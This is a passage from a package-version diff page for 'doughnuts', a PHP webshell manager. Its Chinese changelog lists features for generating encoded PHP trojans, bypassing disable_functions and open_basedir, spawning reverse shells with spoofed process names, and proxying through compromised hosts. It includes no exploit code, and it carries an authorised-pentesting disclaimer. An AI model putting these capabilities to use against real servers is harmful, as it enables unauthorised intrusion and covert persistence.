pysocks\n- 新增命令\n    - proxy命令(通用)  设置连接代理,支持socks,http代理\n    - fl命令(通用) 类似于fc命令，寻找access.log与error.log日志\n- 修改命令\n    - db系列命令 现在支持使用PDO扩展来连接其他数据库\n    - db_init 添加参数，支持使用PDO连接其他数据库。参数db_init {host} {username} {password} {dbname=\'\'} {port=0} {dbms=\'mysql\'}\n    - touch命令 增加创建空文件的功能（不限目标系统）\n- 修复bug\n    - 在某些情况下调用外带编辑器失败\n    - ls后输入相关命令无法补全文件夹名\n- 修改文本\n\n\n### V3.2\n- 新增命令\n    - lsh|!命令(通用) 在当前机器中运行命令,可用于切换工作目录\n    - debug命令(通用但不在帮助菜单中显示) debug SEND/LOOP 开启/关闭SEND/LOOP的调试()调试专用\n    - **generate|gen命令 (初始界面) 生成php木马,使用自制的编码方式进行编码**\n        - generate的调用方式:\n        - 直接在交互式界面外调用:\n            - 在执行`python3 -m doughnuts.install`后:`doughnuts generate a.php POST 123 1`\n            - `python3 doughnuts.py generate a.php POST 123`\n        - 在交互式界面调用:\n            - `doughnutsgenerate a.php POST 123`\n- 修改命令\n    - search命令 现在search命令的调用方式为: `search {pattern} {web_file_path}`,支持正则表达式\n    - c|connect 命令 (初始界面) 现在支持额外参数,并且可以在交互式界面外调用,如:\n        - 在执行`python3 -m doughnuts.install`后:`doughnuts connect http://127.0.0.1/eval.php POST asd data:a=123` \n    - ls|dir 命令 现在支持模式选择：scandir(1)/glob(2)\n    - write、edit、execute支持调用自定义的编辑器\n- 修改项目结构\n- 修改文本错误\n- 修复bug\n\n\n### V3.1\n- 新增命令\n    - rm命令(初始界面) 删除指定webshell记录\n    - log命令(通用) (只支持*unix)将输入与输出记录到日志中\n\n\n### V3.0\n- 重新修改了bdf的顺序,添加了新模式\n    - -1:close\n    - auto: 自动识别\n    - 0(默认):查看bdf当前状态\n    - 1:php7-backtrace\n    - 2:php7-gc\n    - 3:php7-json\n    - 4:LD_PRELOAD\n    - 5:FFI\n    - 6:COM\n    - 7:imap_open\n- 修改命令参数解析,使用shlex库进行解析\n- 修复了一些在终端输入的bug\n- 使用LD_PRELOAD来绕过disable_functions,在退出后会尝试自动清理\n\n\n### V2.9\n- 修改了bdf模式顺序,原模式2-3顺移为3-4,新增bdf命令模式\n    - mode2 php7-json\n        - 利用php-json反序列化绕过disable_functions\n    - mode5 COM\n        - 利用windows组件绕过disable_functions\n\n\n\n### V2.8\n- 修复一堆bug\n- 新增bdf命令模式\n    - mode2 LD_PRELOAD\n        - 利用ld_preload绕过disable_functions,需要上传编译好的.so文件,若自带的.so文件不起效,请在auxiliary找到ld_preload.c自行在于目标近似的环境下编译并覆盖原文件\n    - mode3 FFI\n        - 利用FFI扩展绕过disable_functions,需要PHP7.4及以上\n\n\n### V2.7\n- 一些细微的调整\n- 修改核心逻辑\n- 添加命令\n    - bdf 尝试绕过disable_functions.目前只支持php7-backtrace这个模式\n    - bobd 尝试利用ini_set与chdir绕过open_basedir.\n\n\n### V2.6\n- 修复bug\n- 修改命令\n    - shell 可以非交互运行一句系统命令\n    - webshell 可以非交互运行一句webshell代码\n- 添加命令\n    - execute 调用notepad/vi运行一段自定义的php代码\n    - getenv 获取php环境变量\n\n\n### V2.5\n- 新增依赖 prettytable\n- 添加一系列数据库管理命令\n    - db_init 初始化数据库连接\n    - db_info 输出数据库信息\n    - db_use 修改当前所在数据库\n    - db_dbs 输出所有数据库信息\n    - db_tables 输出某个数据库的所有表信息\n    - db_columns 输出某个表的所有字段信息\n    - db_shell 获得一个临时的sql shell\n\n\n### V2.4\n- 继续优化输入,现在支持历史命令补全,命令补全以及执行ls之后的文件(夹)名补全\n\n\n### V2.3\n- 尝试绕过disable_functions寻找可执行的系统命令函数\n- 请求错误处理\n- read命令更名为cat命令,别名为c\n- 添加move(mv),chmod命令\n\n\n### V2.2\n- 重写输入，现在支持按下ctrl+c与ctrl+d\n- 添加clear命令\n\n\n### V2.1\n- 修改windows环境下python反弹shell上传位置,并使其可以返回错误\n- 修改帮助菜单为等宽\n- 添加socks命令,用于在目标主机中开启socks5服务器\n\n\n### V2.0\n\n- 修复一个BUG曾导致无法连接php7的webshell\n- 修复一个BUG曾导致help无法输出对应的帮助\n- 修改help命令的别名为?,现在只输入?或help将输出帮助菜单\n- 修改info输出的信息\n- 修改各个函数的帮助信息,变得更加统一\n- 重写fc与fwpf命令,重写树状输出\n- 新增ls,bindshell(only for *unix)命令\n\n### V1.9\n- 添加search命令,使用glob函数递归搜索文件.命令格式为search {pattern}\n\n### V1.8\n- 优化连接时发送的请求,从发送三次变成发送2次\n- 修改pdf命令的逻辑,在连接时获取\n- 优化reshell命令,命令格式为reshell {lhost} {port} {type=[python|script|upload]{1|2|3},default = 0 (Python:1 Not Python:3)} {(Only for Mode 2) fakename=/usr/lib/systemd} 三种模式分别为:1->使用python pty模块升级, 2->使用linux自带的script命令升级, 3->上传一个反弹pty的二进制文件并运行(可以伪造进程名,若无法反弹请进入libs目录拿取源码,使用目标相同发行版进行编译后覆盖原reverse_server_light文件)\n\n\n### V1.7\n\n- 修改reshell命令,修复bug,优化体验,可以随意伪装进程名\n- 在libs目录下放置reverse_server_light的源码,方便编译与修改(origin:https://github.com/QAX-A-Team/ptyshell)\n- 重写portscan,支持三种扫描方式\n\n\n### V1.6\n\n- 修复了若干bug\n- 添加了reshell命令,监听本地端口,并让目标反弹一个完整交互式的shell(仅限双方系统都是linux且可能存在一定的问题)\n\n\n### V1.5\n\n- modify指令现在会调用notepad/vim进行编辑\n- write指令现在会调用notepad/vim进行编辑\n- dump命令现在使用原始php代码进行压缩,可以压缩子目录\n- 优化了发送payload的间隔符\n\n### V1.4\n\n- 添加指令:修改文件\n- 关闭debug模式\n- 修复了某些情况下fwpf,fc指令无法使用的情况,现在发送数据时会关闭错误提示\n\n\n## 免责声明\n\n本项目仅供网站管理人员与渗透测试人员学习与交流,任何使用本项目进行的一切未授权攻击行为与本人无关.\n\n',
     'author': 'WAY29',
     'author_email': 'toloveu29@gmail.com',
     'maintainer': None,
     'maintainer_email': None,
     'url': 'https://github.com/way29/doughnuts',
     'packages': packages,
     'package_data': package_data,
```

### Comparing `doughnuts-4.9.3/PKG-INFO` & `doughnuts-4.9.4/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: doughnuts
-Version: 4.9.3
+Version: 4.9.4
 Summary: A webshell manager for PHP
 Home-page: https://github.com/way29/doughnuts
 License: MIT
 Author: WAY29
 Author-email: toloveu29@gmail.com
 Requires-Python: >=3.6,<4.0
 Classifier: License :: OSI Approved :: MIT License
@@ -282,15 +282,15 @@
 - 4.9.0
     - 修改核心
         - 添加custom_plugins目录,用于存放用户自己编写的插件
         - 添加config.ini文件,用于配置相关参数
 - 4.9.1
     - 修复在pypi版本与github版本不一致的问题
 - 4.9.2
-- 4.9.3
+- 4.9.3, 4.9.4
     - 修复在不存在自定义命令时连接webshell后帮助菜单无法显示的bug
 
 ### 4.8
 - 4.8.0
     - 修改命令
         - generate命令 现在支持在自定义webshell模板,在doughnuts/webshell_plugins下可以添加自己的模板,详情请查看上面的自定义webshell模板
 - 4.8.1
```

